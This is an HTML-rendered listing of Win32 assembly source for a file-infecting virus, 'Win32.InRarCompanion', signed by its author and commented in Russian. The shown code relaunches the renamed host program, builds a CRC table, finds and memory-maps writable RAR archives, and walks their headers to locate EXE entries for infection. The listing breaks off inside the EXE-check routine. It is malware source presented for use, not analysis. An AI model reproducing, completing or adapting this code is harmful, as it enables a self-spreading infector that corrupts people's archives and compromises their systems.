<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>RAR32INF.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc14 {
	font-weight: bold;
	color: #804000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">        </span><span class="sc5">ideal</span><span class="sc0">
        </span><span class="sc5">p586</span><span class="sc0">
        </span><span class="sc5">model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">MB_OK</span><span class="sc0">                           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">                    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">                   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">                  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc3">"winprocs.inc"</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc3">"struc.inc"</span><span class="sc0">

</span><span class="sc5">vsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3000h</span><span class="sc0">                   </span><span class="sc1">; размер вируса ???</span><span class="sc0">
</span><span class="sc5">virext</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'DSM.'</span><span class="sc0">                  </span><span class="sc1">; на что меняется .EXE</span><span class="sc0">
</span><span class="sc5">runext</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc12">'EXE.'</span><span class="sc0">                  </span><span class="sc1">; расширение заражаемый файлов</span><span class="sc0">
</span><span class="sc5">minsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">200000</span><span class="sc0">                  </span><span class="sc1">; min размер заражаемого архива</span><span class="sc0">
</span><span class="sc5">maxinfc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; max кол-во заражений за раз</span><span class="sc0">

        </span><span class="sc5">dataseg</span><span class="sc0">
</span><span class="sc5">CRC_Table</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; для CreateProcess</span><span class="sc0">
</span><span class="sc5">ProcInfo</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hFindFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; описатель поиска</span><span class="sc0">
</span><span class="sc5">hFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; описатель файла</span><span class="sc0">
</span><span class="sc5">hFileM</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; описатель проекции</span><span class="sc0">
</span><span class="sc5">hFileMV</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; размер файла</span><span class="sc0">
</span><span class="sc5">RarHdrOfs</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; смещение нужного заголовка в архиве</span><span class="sc0">

</span><span class="sc5">szCaption</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MuStDiE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szText</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Win32.InRarCompanion by FRiZER`99'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'mailto:v666x@mail.ru'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msk</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.rar'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; маска файлов</span><span class="sc0">
</span><span class="sc5">InfCount</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; счетчик заражений</span><span class="sc0">

        </span><span class="sc5">codeseg</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; [ запустим носителя ] -----------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCommandLineA</span><span class="sc0">         </span><span class="sc1">; получения адреса коммандной строки</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; запомним в ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">; длина командной строки</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">scan_cmd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">                </span><span class="sc1">; найдем '.'</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">                   </span><span class="sc1">; ищем</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Myxa_Not_Found</span><span class="sc0">          </span><span class="sc1">; не нашли - выведем msgbox</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; eax - расширение файла</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">      </span><span class="sc1">; приведем к верхнему регистру</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">runext</span><span class="sc0">             </span><span class="sc1">; нашли .EXE ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">scan_cmd</span><span class="sc0">                </span><span class="sc1">; нет - ищем дальше</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virext</span><span class="sc0">   </span><span class="sc1">; меняем расширение</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcInfo</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; имя запускаемой программы</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateProcessA</span><span class="sc0">          </span><span class="sc1">; запускаем носителя</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; удачно запустили?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">BeginVir</span><span class="sc0">                </span><span class="sc1">; да - пусть работает вирус</span><span class="sc0">
</span><span class="sc5">Myxa_Not_Found</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; нет - выведем msgbox</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szCaption</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szText</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc5">BeginVir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InfCount</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; обнуляем счетчик заражений</span><span class="sc0">

</span><span class="sc1">; [ создание таблицы для подсчета CRC ] -------------------------------------</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CRC_Table</span><span class="sc4">+</span><span class="sc2">1020</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">thloop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">tlloop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">cf0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">cf0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">tlloop</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">thloop</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">; [ поиск первого файла из *.rar ] ------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">              </span><span class="sc1">; структура поиска</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msk</span><span class="sc0">              </span><span class="sc1">; ofs маски файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc1">; ищем первый подходящий файл</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc1">; обломили?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndFind</span><span class="sc0">                 </span><span class="sc1">; да - запустим носителя</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFindFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; нет - сохраним описатель</span><span class="sc0">

</span><span class="sc5">CheckRar</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">; обработаем найденый файл</span><span class="sc0">
</span><span class="sc1">; [ открываем файл ] --------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;        mov     ebp, esp                ; ebp - ofs заполненной структуры</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; файл-пример атрибутов</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; аттрибуты файла - не нужны</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">           </span><span class="sc1">; открываем существующий файл</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; установка защиты по умолчанию</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0"> </span><span class="sc1">; тип совместного доступа</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc1">; способ доступа к файлу</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">FindData</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc4">)</span><span class="sc5">.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; ofs имени файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc1">; откроем файл</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc1">; обломили с открытием?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FindNext</span><span class="sc0">                </span><span class="sc1">; да - ищем следующий</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; нет - сохраним описатель</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; для CreateFileMappingA</span><span class="sc0">

</span><span class="sc1">; [ узнаем размер открытого файла ] -----------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc0">         </span><span class="sc1">; куда пойдет старшая часть размера</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; описатель файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc1">; получим размер</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; сохранием размер</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">minsize</span><span class="sc0">            </span><span class="sc1">; размер файла &gt; minsize</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Close_hFile</span><span class="sc0">             </span><span class="sc1">; нет - найдем другой</span><span class="sc0">

</span><span class="sc1">; [ создаем проекцию файла ] ------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; имя проекции (не требуется)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; low-часть  размера</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; high-часть/  0 - текущий размер</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">          </span><span class="sc1">; можно считывать и записывать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; установка защиты по умолчанию</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; описатель файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc1">; создадим проекцию файла</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; обломили?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Close_hFile</span><span class="sc0">             </span><span class="sc1">; да - закроем файл и найдем другой</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFileM</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;        push    eax                     ;</span><span class="sc0">

</span><span class="sc1">; [ проецируем файловые данные на адресное пространство процесса ] ----------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; проецировать весь файл</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; low-part -, смещения с которого</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; high-part/  начинать проецировать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">          </span><span class="sc1">; можно считывать и записывать</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; описатель проекции файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc1">; проецируем</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; обломили?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Close_hFileM</span><span class="sc0">            </span><span class="sc1">; да - закроем описатель проекции...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">hFileMV</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; ebx - начало RAR архива</span><span class="sc0">

</span><span class="sc1">; [ обрабатываем файл ] -----------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'!raR'</span><span class="sc0">     </span><span class="sc1">; файл действительно архив RAR?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_rar</span><span class="sc0">                 </span><span class="sc1">; нет - пойдем искать следующий</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                  </span><span class="sc1">; следующий блок</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">                 </span><span class="sc1">; подходит ли архив для заражения</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">bad_rar</span><span class="sc0">                 </span><span class="sc1">; нет - поищем другой</span><span class="sc0">

</span><span class="sc1">; [ проверка на окончание файла ] -------------------------------------------</span><span class="sc0">
</span><span class="sc5">check_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; eax - ofs после проекции файла</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; ebx - еще его не достигла?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">bad_rar</span><span class="sc0">                 </span><span class="sc1">; да - пойдем искать следующий</span><span class="sc0">

</span><span class="sc1">; [ проверка блока на заголовок файла ] -------------------------------------</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0"> </span><span class="sc1">; заголовок файла?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_if_exe</span><span class="sc0">            </span><span class="sc1">; да - проверим EXE ли это</span><span class="sc0">

</span><span class="sc1">; [ переход к следующему блоку ] --------------------------------------------</span><span class="sc0">
</span><span class="sc5">next_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.head_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; eax - размер заголовка</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.pack_size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; ebx - начало следующего блока</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_block</span><span class="sc0">             </span><span class="sc1">; поехали опять проверять</span><span class="sc0">

</span><span class="sc1">; [ проверка расширения найденного в архиве файла на EXE ] ------------------</span><span class="sc0">
</span><span class="sc5">check_if_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.file_name</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebp - ofs имени файла</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc5">rar</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">)</span><span class="sc5">.name_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; eax - длинна имени</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; ebp - ofs после имени файла</span><span class="sc0">
